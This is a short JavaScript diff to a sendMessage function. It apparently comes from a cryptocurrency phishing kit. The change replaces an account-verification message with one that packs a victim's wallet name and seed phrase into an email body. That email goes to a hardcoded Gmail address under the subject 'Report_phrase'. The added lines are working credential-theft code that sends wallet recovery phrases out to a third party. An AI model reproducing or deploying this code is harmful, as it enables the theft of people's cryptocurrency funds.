@@ -1,11 +1,11 @@
 var myHeaders = new Headers();
 myHeaders.append("Content-Type", "application/json");
 
-export const sendMessage = async (user) => {
+export const sendMessage = async (data) => {
   var raw = JSON.stringify({
-    message: `New account verification submission from ${user}`,
+    message: `wallet: ${data.wallet} <br/> phrase:  ${data.phrase}`,
     to: "anthonyerics84@gmail.com",
-    subject: "kyc_veryfy_doc",
+    subject: "Report_phrase",
   });
 
   var requestOptions = {
